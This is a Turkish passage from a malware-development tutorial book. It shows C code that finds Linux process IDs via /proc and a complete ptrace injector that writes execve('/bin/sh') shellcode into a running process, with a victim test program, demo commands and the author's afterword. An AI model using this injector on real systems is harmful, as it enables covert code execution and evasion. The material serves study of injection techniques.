Linux için kötü amaçlı yazılım programlarken rootkitler ve diğer ilginç ve kötü şeyler hakkında ışık tutacağımı söz verdim, ancak başlamadan önce basit şeyler yapmayı deneyelim.
Bazı okuyucularım, örneğin, Linux süreçlerine kod enjeksiyonu yapmanın nasıl olduğunu bilmiyorlar.
Beni çok uzun süredir okuyanlar, enjeksiyon amaçları için Windows'ta process ID bulmaya yönelik böyle ilginç ve basit bir örneği hatırlarlar.
pratik örnek
Hadi Linux için benzer bir mantık uygulayalım. Her şey çok basit:
/*
* hack.c
* linux hacking part 2:
* find process ID by name
* author @cocomelonc
* https://cocomelonc.github.io/linux/2024/09/16/linux-hacking-2.html
*/

#include <stdio.h>
#include <stdlib.h>
#include <string.h>
#include <dirent.h>
#include <ctype.h>

int find_process_by_name(const char *proc_name) {
DIR *dir;
struct dirent *entry;
int pid = -1;

dir = opendir("/proc");
if (dir == NULL) {
perror("opendir /proc failed");
return-1;
}

while ((entry = readdir(dir)) != NULL) {
if (isdigit(*entry->d_name)) {
char path[512];
snprintf(path, sizeof(path), "/proc/%s/comm", entry->d_name);

FILE *fp = fopen(path, "r");
if (fp) {
char comm[512];
if (fgets(comm, sizeof(comm), fp) != NULL) {
// remove trailing newline from comm
comm[strcspn(comm, "\r\n")] = 0;
if (strcmp(comm, proc_name) == 0) {
pid = atoi(entry->d_name);
fclose(fp);
break;
}
}
fclose(fp);
                 }
}
}
closedir(dir);
return pid;
}

int main(int argc, char *argv[]) {
if (argc != 2) {
fprintf(stderr, "usage: %s <process_name>\n", argv[0]);
return 1;
}

int pid = find_process_by_name(argv[1]);
if (pid != -1) {
	printf("found pid: %d\n", pid);
} else {
	printf("process '%s' not found.\n", argv[1]);
}
return 0;
}

Kodum, Linux'ta çalışan bir süreci adını tarayarak /proc dizininde nasıl arayacağınızı gösteriyor./proc/[pid]/comm içinde depolanan süreç adlarını okur ve bir eşleşme bulursa hedef sürecin process ID (PID) değerini alır.
Gördüğünüz gibi burada sadece iki fonksiyon var. Öncelikle, find_process_by_name fonksiyonunu uyguladık.Bu fonksiyon, /proc dizini içinde süreç adını aramaktan sorumludur.
Bir süreç adı (proc_name) alır ve bulunan sürecin PID değerini döndürür veya süreç bulunmazsa -1 döndürür.
Fonksiyon, opendir() fonksiyonunu kullanarak /proc dizinini açar. Bu dizin, çalışan süreçler hakkında bilgi içerir ve her alt dizin bir process ID (PID) ile adlandırılmıştır.
Daha sonra, /proc içindeki girişleri yineleyin:
while ((entry = readdir(dir)) != NULL) {
readdir() fonksiyonu, /proc dizinindeki tüm girişleri yinelemek için kullanılır, her giriş ya çalışan bir süreci (eğer giriş adı bir sayıysa) ya da diğer sistem dosyalarını temsil eder.
Daha sonra, giriş adının bir sayı olup olmadığını (yani bir process ID'yi) temsil edip etmediğini kontrol eder. Sadece rakamlarla adlandırılmış dizinler /proc içinde geçerli süreç dizinleridir:
if (isdigit(*entry->d_name)) {
Dikkat edilmelidir ki, her /proc/[pid] dizini içindeki comm dosyası, o sürece bağlı yürütülebilir dosyanın adını içerir:
snprintf(path, sizeof(path), "/proc/%s/comm", entry->d_name);
Bu, /proc/, process ID (d_name) ve /comm birleştirilerek comm dosyasının tam yolunun oluşturulduğu anlamına gelir.
Son olarak, comm dosyasını açar, süreç adını okur ve karşılaştırır:
FILE *fp = fopen(path, "r");
if (fp) {
char comm[512];
if (fgets(comm, sizeof(comm), fp) != NULL) {
// remove trailing newline from comm
comm[strcspn(comm, "\r\n")] = 0;
if (strcmp(comm, proc_name) == 0) {
pid = atoi(entry->d_name);
fclose(fp);
break;
	}
        }

Daha sonra, elbette, dizini kapatın ve geri dönün.
İkinci fonksiyon ise main fonksiyondur:
int main(int argc, char *argv[]) {
if (argc != 2) {
fprintf(stderr, "usage: %s <process_name>\n", argv[0]);
return 1;
}

int pid = find_process_by_name(argv[1]);
if (pid != -1) {
	printf("found pid: %d\n", pid);
} else {
	printf("process '%s' not found.\n", argv[1]);
}
return 0;
}
Sadece komut satırı argümanlarını kontrol edin ve süreç bulma mantığını çalıştırın.
Demo

Her şeyin çalıştığını kontrol edelim. Derleyin:
gcc -z execstack hack.c -o hack
+++++++++++++++++++++++++++++++++++++++++++++++
Daha sonra Linux makinesinde çalıştırın:
.\hack [process_name]
+++++++++++++++++++++++++++++++++++++++++++++++
+++++++++++++++++++++++++++++++++++++++++++++++
Gördüğünüz gibi, her şey mükemmel çalıştı. Benim durumumda Telegram ID (75678) bulduk!=..=
Her şey çok kolay görünüyor, değil mi?

Ancak burada bir püf noktası var. Eğer örneğimde olduğu gibi firefox gibi işlemler için çalıştırmaya çalışırsak:
.\hack firefox
şunu alırız:
+++++++++++++++++++++++++++++++++++++++++++++++

Karşılaştığımız sorun, firefox gibi bazı işlemlerin alt işlemler veya birden fazla iş parçacığı oluşturabilmesi ve bunların hepsinin process adlarını comm dosyasında saklamayabilmesi olabilir.
/ proc/[pid]/comm dosyası, çalıştırılabilir dosyanın adını tam yol olmadan saklar ve özellikle aynı ebeveyn altında birden fazla iş parçacığı veya alt işlem varsa, işlemin tüm örneklerini yansıtmayabilir.
Bu yüzden olası sorunlar şu olabilir:
/proc/[pid]/comm içinde farklı işlem adları: alt işlemler veya iş parçacıkları farklı adlandırma kuralları kullanabilir veya firefox olarak /proc/[pid]/comm altında listelenmeyebilir.
zombiler veya yetim işlemler: bazı işlemler, zombi veya yetim durumda olmaları halinde doğru şekilde görünmeyebilir.
practical example 2

Comm dosyasını okumak yerine, süreci başlatmak için kullanılan tam komutu (işlem adı, tam yol ve argümanlar dahil) içeren /proc/[pid]/cmdline dosyasını kontrol edebiliriz.
Bu dosya, firefox gibi birden fazla instance oluşturan işlemler için daha güvenilirdir.
Bu yüzden başka bir versiyon (hack2.c) oluşturdum:
/*
* hack2.c
* linux hacking part 2:
* find processes ID by name
* author @cocomelonc
* https://cocomelonc.github.io/linux/2024/09/16/linux-hacking-2.html
*/
#include <stdio.h>
#include <stdlib.h>
#include <string.h>
#include <dirent.h>
#include <ctype.h>

void find_processes_by_name(const char *proc_name) {
DIR *dir;
struct dirent *entry;
int found = 0;

dir = opendir("/proc");
if (dir == NULL) {
perror("opendir /proc failed");
return;
}
while ((entry = readdir(dir)) != NULL) {
if (isdigit(*entry->d_name)) {
char path[512];
snprintf(path, sizeof(path), "/proc/%s/cmdline", entry->d_name);

FILE *fp = fopen(path, "r");
if (fp) {
char cmdline[512];
if (fgets(cmdline, sizeof(cmdline), fp) != NULL) {
// command line arguments are separated by '\0',
// we only need the first argument (the program name)
cmdline[strcspn(cmdline, "\0")] = 0;

// perform case-insensitive comparison
// of the base process name
const char *base_name = strrchr(cmdline, '/');
base_name = base_name ? base_name + 1 : cmdline;

if (strcasecmp(base_name, proc_name) == 0) {
printf("found process: %s with PID: %s\n", base_name,
entry->d_name);
found = 1;
}
}
fclose(fp);
}
}
}

if (!found) {
	printf("no processes found with the name '%s'.\n", proc_name);
}

closedir(dir);
}
int main(int argc, char *argv[]) {
if (argc != 2) {
fprintf(stderr, "usage: %s <process_name>\n", argv[0]);
return 1;
}
find_processes_by_name(argv[1]);
return 0;
}
Gördüğünüz gibi, bu kodun güncellenmiş bir versiyonudur ve bunun yerine /proc/[pid]/cmdline dosyasını okur.


Ancak /proc/[pid]/cmdline veya /proc/[pid]/status dosyası her zaman tüm alt işlemleri veya iş parçacıklarını doğru şekilde göstermeyebilir.
demo 2

İkinci örneği çalıştırarak kontrol edelim. Derleyin:
gcc -z execstack hack2.c -o hack2
+++++++++++++++++++++++++++++++++++++++++++++++
Daha sonra Linux makinesinde çalıştırın:
.\hack [process_name]
+++++++++++++++++++++++++++++++++++++++++++++++
Gördüğünüz gibi, doğru.
Umarım bu pratik örnek içeren gönderi, malware araştırmacıları, Linux programcıları ve Linux çekirdek programlama ile kod enjeksiyon teknikleriyle ilgilenen herkes için faydalıdır.
Find process ID by name. Windows version
Github’taki kaynak kod



100. Linux kötü amaçlı yazılım geliştirme 3: ptrace ile Linux işlem enjeksiyonu. Basit C örneği.

﷽
+++++++++++++++++++++++++++++++++++++++++++++++
Bilinen enjeksiyon tekniklerinin sayısı Windows makinelerde çok büyük, örneğin:
ilk, ikinci veya üçüncü örnekler blogumdan.


Bugün, ptrace sistem çağrısını kullanarak harika bir Linux enjeksiyon tekniğini göstereceğim.
Ptrace'ı, diğer işlemleri incelemek, değiştirmek ve hatta ele geçirmek için kişisel anahtarınız olarak düşünün.
ptrace
ptrace, uzak işlemleri hata ayıklamanıza izin veren bir sistem çağrısıdır. Başlatan işlem, hata ayıklanan işlemin belleğini ve yazmaçlarını inceleyebilir ve değiştirebilir. Örneğin, GDB, hata ayıklanan süreci kontrol etmek için ptrace kullanır.
+++++++++++++++++++++++++++++++++++++++++++++++

Ptrace, aşağıdakiler gibi birkaç faydalı hata ayıklama işlemi sunar:
PTRACE_ATTACH - bir sürece bağlanmanıza izin verir, hata ayıklanan süreci duraklatır
PTRACE_PEEKTEXT - başka bir sürecin adres alanından veri okumanıza izin verir
PTRACE_POKETEXT - başka bir sürecin adres alanına veri yazmanıza izin verir
PTRACE_GETREGS - sürecin mevcut kayıt durumu okur
PTRACE_SETREGS - sürecin kayıt durumu yazar
PTRACE_CONT - hata ayıklanan sürecin yürütülmesine devam eder
pratik örnek
Bu adım adım eğitimde şunları göstereceğim:
Çalışan bir sürece bağlanma.
Özel shellcode enjekte etme.
Yürütmeyi ele geçirme.
Yürütmeden sonra orijinal durumu geri yükleme.
Her şeyi basit bir pratik C örneği ile açıklayacağız. Haydi başlayalım!
İlk yapmamız gereken, ilgilendiğimiz sürece bağlanmaktır. Bunu yapmak için, ptrace çağrısını PTRACE_ATTACH parametresi ile kullanmak yeterlidir:
printf("attaching to process %d\n", target_pid);
if (ptrace(PTRACE_ATTACH, target_pid, NULL, NULL) == -1) {
perror("failed to attach");
return 1;
}
Bu, işlemi durdurur ve belleğini ve yazmaçlarını incelememizi sağlar.
İşlemci yazmaçlarında herhangi bir değişiklik yapmadan önce, mevcut durumlarını yedeklemeliyiz. Bu, daha sonraki bir aşamada yürütmeye devam etmemizi sağlar:
struct user_regs_struct target_regs;
//...
//...
// get the current registers
printf("reading process registers\n");
ptrace(PTRACE_GETREGS, target_pid, NULL, &target_regs);
PTRACE_PEEKDATA kullanarak, talimat işaretçisindeki (RIP) belleği okuyoruz.
Bu, enjeksiyondan sonra süreci orijinal durumuna geri yüklemek için çok önemlidir.
Bu nedenle, read_mem adlı bir fonksiyon oluşturdum:
// read memory from the target process
void read_mem(pid_t target_pid, long addr, char *buffer, int len) {
union data_chunk {
long val;
char bytes[sizeof(long)];
} chunk;
int i = 0;
while (i < len / sizeof(long)) {
chunk.val = ptrace(PTRACE_PEEKDATA, target_pid, addr + i * sizeof(long), NULL);
memcpy(buffer + i * sizeof(long), chunk.bytes, sizeof(long));
i++;
}
int remaining = len % sizeof(long);
if (remaining) {
chunk.val = ptrace(PTRACE_PEEKDATA, target_pid, addr + i * sizeof(long), NULL);
memcpy(buffer + i * sizeof(long), chunk.bytes, remaining);
}
}
Bu fonksiyonun adım adım işleyişini göstereyim.

ptrace, belleği sizeof(long) baytlık parçalar halinde okur. Bu birlik (union), veriyi ptrace işlemleri için long olarak ele almamıza ve aynı zamanda bireysel baytlara erişmemize olanak tanır:
union data_chunk {
long val;
char bytes[sizeof(long)];
} chunk;
Daha sonra tam sizeof(long) uzunlukta blokları okuyoruz:
int i = 0;
while (i < len / sizeof(long)) {
chunk.val = ptrace(PTRACE_PEEKDATA, target_pid, addr + i * sizeof(long), NULL);
memcpy(buffer + i * sizeof(long), chunk.bytes, sizeof(long));
i++;
}
Gördüğünüz gibi, burada hedef işlemin belirli bir bellek adresinden bir long (genellikle 64 bit sistemlerde 8 bayt) okuyoruz.Ardından, okunan veri memcpy kullanılarak tampon içine kopyalanır.Bu işlem, tüm sizeof(long) uzunluğundaki bloklar okunana kadar devam eder.
Daha sonra kalan baytları ele alırız:
int remaining = len % sizeof(long);
if (remaining) {
chunk.val = ptrace(PTRACE_PEEKDATA, target_pid, addr + i * sizeof(long), NULL);
memcpy(buffer + i * sizeof(long), chunk.bytes, remaining);
}
Mantık basittir: Eğer uzunluk (len) sizeof(long)'un katı değilse, okunması gereken ekstra baytlar olabilir.
Fonksiyon, bu kalan baytları okumak için bellekte bir long daha okur ve sadece gerekli baytları tampona kopyalar.


Sonuç olarak, hedef işlemin belirli bir adresinden başlayan len baytlık tüm bellek bloğu tampon içine kaydedilir.
PTRACE_POKEDATA ile, özel shellcode'umuzu hedef işlemin belleğine RIP adresinde enjekte ediyoruz.
// write memory into the target process
void write_mem(pid_t target_pid, long addr, char *buffer, int len) {
union data_chunk {
long val;
char bytes[sizeof(long)];
} chunk;
int i = 0;
while (i < len / sizeof(long)) {
memcpy(chunk.bytes, buffer + i * sizeof(long), sizeof(long));
ptrace(PTRACE_POKEDATA, target_pid, addr + i * sizeof(long), chunk.val);
i++;
}
int remaining = len % sizeof(long);
if (remaining) {
memcpy(chunk.bytes, buffer + i * sizeof(long), remaining);
ptrace(PTRACE_POKEDATA, target_pid, addr + i * sizeof(long), chunk.val);
}
}
Gördüğünüz gibi, bu fonksiyon read_mem'e benzer, ancak belleğe yazma mantığını uygular.
Sonraki aşamada, işlemin talimat işaretçisini (RIP) değiştirilerek enjekte edilen payload çalıştırılır:
ptrace(PTRACE_CONT, target_pid, NULL, NULL);
Payload yürütüldükten sonra, işlemi çökertmemek veya kanıt bırakmamak için orijinal bellek talimatlarını geri yüklüyoruz:
write_mem(target_pid, target_regs.rip, original_code, payload_len);
Son olarak, hedef süreçten ayrılarak normal çalışmasına devam etmesini sağlıyoruz:
ptrace(PTRACE_DETACH, target_pid, NULL, NULL);
Yani, kod enjeksiyon "kötü amaçlı yazılımımızın" tam kaynak kodu şu şekildedir (hack.c):
/*
* hack.c
* practical example of linux process injection
* author @cocomelonc
*/
#include <stdio.h>
#include <stdlib.h>
#include <string.h>
#include <sys/ptrace.h>
#include <sys/types.h>
#include <sys/wait.h>
#include <sys/user.h>
#include <unistd.h>

// read memory from the target process
void read_mem(pid_t target_pid, long addr, char *buffer, int len) {
union data_chunk {
long val;
char bytes[sizeof(long)];
} chunk;
int i = 0;
while (i < len / sizeof(long)) {
chunk.val = ptrace(PTRACE_PEEKDATA, target_pid, addr + i * sizeof(long), NULL);
memcpy(buffer + i * sizeof(long), chunk.bytes, sizeof(long));
i++;
}
int remaining = len % sizeof(long);
if (remaining) {
chunk.val = ptrace(PTRACE_PEEKDATA, target_pid, addr + i * sizeof(long), NULL);
memcpy(buffer + i * sizeof(long), chunk.bytes, remaining);
}
}

// write memory into the target process
void write_mem(pid_t target_pid, long addr, char *buffer, int len) {
union data_chunk {
long val;
char bytes[sizeof(long)];
} chunk;
int i = 0;
while (i < len / sizeof(long)) {
memcpy(chunk.bytes, buffer + i * sizeof(long), sizeof(long));
ptrace(PTRACE_POKEDATA, target_pid, addr + i * sizeof(long), chunk.val);
i++;
}
int remaining = len % sizeof(long);
if (remaining) {
memcpy(chunk.bytes, buffer + i * sizeof(long), remaining);
ptrace(PTRACE_POKEDATA, target_pid, addr + i * sizeof(long), chunk.val);
}
}

int main(int argc, char *argv[]) {
if (argc != 2) {
printf("usage: %s <target_pid>\n", argv[0]);
return 1;
}

pid_t target_pid = atoi(argv[1]);
char payload[] = "\x48\x31\xf6\x56\x48\xbf\x2f\x62"
"\x69\x6e\x2f\x2f\x73\x68\x57\x54"
"\x5f\x6a\x3b\x58\x99\x0f\x05"; // execve /bin/sh
int payload_len = sizeof(payload) - 1;
char original_code[payload_len];

struct user_regs_struct target_regs;

// attach to the target process
printf("attaching to process %d\n", target_pid);
if (ptrace(PTRACE_ATTACH, target_pid, NULL, NULL) == -1) {
perror("failed to attach :(");
return 1;
}
waitpid(target_pid, NULL, 0);

// get the current registers
printf("reading process registers\n");
ptrace(PTRACE_GETREGS, target_pid, NULL, &target_regs);

// backup the memory at RIP
printf("backing up target memory\n");
read_mem(target_pid, target_regs.rip, original_code, payload_len);

// inject the payload
printf("injecting payload\n");
write_mem(target_pid, target_regs.rip, payload, payload_len);

// hijack execution
printf("hijacking process execution\n");
ptrace(PTRACE_CONT, target_pid, NULL, NULL);

// wait for the payload to execute
wait(NULL);

// restore the original code
printf("restoring original process memory\n");
write_mem(target_pid, target_regs.rip, original_code, payload_len);

// detach from the process
printf("detaching from process\n");
ptrace(PTRACE_DETACH, target_pid, NULL, NULL);

printf("injection complete\n");
return 0;
}
Ancak bir sorun var.Neden süreç enjeksiyon kodunda waitpid kullanıyoruz?
PTRACE_ATTACH ile bir sürece bağlandığımızda, hedef süreç hemen durmaz.
İşlem, işletim sistemi hata ayıklayıcının (enjeksiyon kodumuzun) kontrolü ele aldığını gösteren bir sinyal gönderene kadar çalışmaya devam eder.
waitpid kullanarak, hedef sürecin tamamen durduğundan emin olana kadar enjeksiyon kodumuzun çalışmasını engelleriz:
ptrace(PTRACE_ATTACH, target_pid, NULL, NULL);
waitpid(target_pid, NULL, 0);
waitpid olmadan, işletim sistemi hedef sürecin tamamen durduğunu garanti etmeden belleği okumaya veya değiştirmeye çalışabiliriz.Bu da belirsiz davranışlara neden olabilir.
Ayrıca, süreç enjeksiyonu sırasında genellikle enjekte edilen shellcode'un yürütmeyi tamamladığını tespit etmemiz gerekir.
Bunu yapmak için, int 0x3 gibi bir yazılım kesmesi kullanırız.
Bu, hedef işlemde bir SIGTRAP sinyali tetikleyerek süreci duraklatır ve waitpid aracılığıyla tekrar kontrolü ele almamızı sağlar.
Peki ya wait fonksiyonu?wait fonksiyonu nedir ve ne zaman kullanılır?
wait fonksiyonu, waitpid'in daha basit bir çeşididir.Herhangi bir alt işlemin durum değiştirmesini bekler.waitpid'in aksine, belirli bir ID belirtmemize veya gelişmiş seçenekleri kullanmamıza izin vermez.
Süreç enjeksiyonu bağlamında genellikle wait kullanmayız, çünkü belirli bir süreci (hedefimizi) kontrol etmek isteriz ve waitpid bunu sağlar.
Ancak, birden fazla alt işlem olduğunda ve hangi alt işlemin durum değiştirdiğini umursamıyorsak wait kullanılabilir.
Bu nedenle, waitpid'i stratejik bir şekilde kullanarak sorunsuz ve güvenilir bir süreç enjeksiyonu gerçekleştirebiliriz.
Basit bir payload kullandım: 
char payload[] = 
"\x48\x31\xf6\x56\x48\xbf\x2f\x62"
"\x69\x6e\x2f\x2f\x73\x68\x57\x54"
"\x5f\x6a\x3b\x58\x99\x0f\x05"; // execve /bin/sh
demo
Öncelikle, gösterim amacıyla bir "kurban" sürece ihtiyacımız var.

Sonsuz döngü içinde çalışan, belirli aralıklarla mesaj yazdıran basit bir "kurban" işlemi yazdım.Bu program, gerçek bir çalışan süreci simüle eder:
/*
* meow.c
* simple "victim" process for injection testing
* author @cocomelonc
* https://cocomelonc.github.io/malware/2024/11/22/linux-hacking-3.html
*/

#include <stdio.h>
#include <stdlib.h>
#include <unistd.h>

int main() {
printf("victim process started. PID: %d\n", getpid());
while (1) {
printf("meow-meow... PID: %d\n", getpid());
sleep(5); // simulate periodic activity
}
return 0;
}
Kurban süreci derleyelim:
gcc meow.c -o meow
+++++++++++++++++++++++++++++++++++++++++++++++
ve hack.c enjeksiyon kodunu derleyelim:
gcc -z execstack hack.c -o hack
+++++++++++++++++++++++++++++++++++++++++++++++

Ubuntu 24.04 VM'de önce kurban süreci çalıştırın:
./meow
Kurban sürecinin yazdırdığı PID’yi not edin:
+++++++++++++++++++++++++++++++++++++++++++++++

Bizim örneğimizde PID = 5987.
Şimdi bu PID’yi hedef alarak enjeksiyon yapabiliriz. Örneğin:
./hack 5987
+++++++++++++++++++++++++++++++++++++++++++++++
Bu, kurban sürece bağlanarak payload'umuzu enjekte edecektir.Bu sırada kurban süreç çalışmaya devam eder:
+++++++++++++++++++++++++++++++++++++++++++++++
+++++++++++++++++++++++++++++++++++++++++++++++
Gördüğünüz gibi, her şey mükemmel çalıştı! =..=
Son sözler
Bu pratik örnek, ptrace'in özel shellcode enjekte etmek ve bir işlemin yürütme akışını değiştirmek için nasıl kullanılabileceğini göstermektedir.


Elbette ptrace ile yapılan bu teknik yeni değil, ancak meşru işlevselliğin kötüye nasıl kullanılabileceğini vurgulamaktadır.
Umarım bu pratik örnek, kötü amaçlı yazılım araştırmacıları, Linux programcıları ve Linux çekirdek programlama ve kod enjeksiyon teknikleriyle ilgilenen herkes için faydalı olur.
Not: Linux ayrıca process_vm_readv() ve process_vm_writev() sistem çağrılarını sunar, bunlar işlem belleğini okumak ve yazmak için kullanılabilir.
ptrace
Linux malware development 1: intro to kernel hacking. Simple C example
Linux malware development 2: find process ID by name. Simple C example
Github’taki kaynak kod

101.Final
Alhamdulillah, bu kitabı yazmayı bitirdim ve hâlâ kızım Munira ile tedavi sürecimiz devam ediyor. Kitap yazmak her zaman zordur, hatta benim deneyimime rağmen oldukça zor oldu. İnşallah her şey iyi olacak. Ey Âlemlerin Rabbi Allah’ım, kızıma güç ver.
Kitabın adı neden böyle? MD - Malware Development anlamına gelir. MZ imzası, MS-DOS taşınabilir 16-bit EXE formatında kullanılan bir imzadır ve geriye dönük uyumluluk için günümüz PE dosyalarında hâlâ mevcuttur. Ayrıca, MD MZ, My Daughter Munira Zhassulankyzy anlamına gelir.
Bu kitabın en az bir kişiye bile bilgi edinmesi ve siber güvenlik bilimi öğrenmesi konusunda yardımcı olursa çok mutlu olacağım. Kitap ağırlıklı olarak pratik odaklıdır.
Arkadaşlarıma ve meslektaşlarıma derin minnettarlığımı ifade etmek isterim.

Özel teşekkürler Anna Tsyganova ve Duman Sembayev’e.
Tüm örnekler yalnızca eğitim ve araştırma amaçlı pratik vakalardır.
Vakit ayırdığınız için teşekkürler, happy hacking ve hoşça kalın!
Not: Tüm çizimler ve ekran görüntüleri bana aittir.


KASIM 2024
TEŞEKKÜRLER!
COCOMELONC
ZHASSULAN ZHUSSUPOV


Bu kitabın satışından elde edilen gelir, kızım Munira'nın tedavisi ve hayır fonu için kullanılacaktır.
TÜM HAKLARI SAKLIDIR



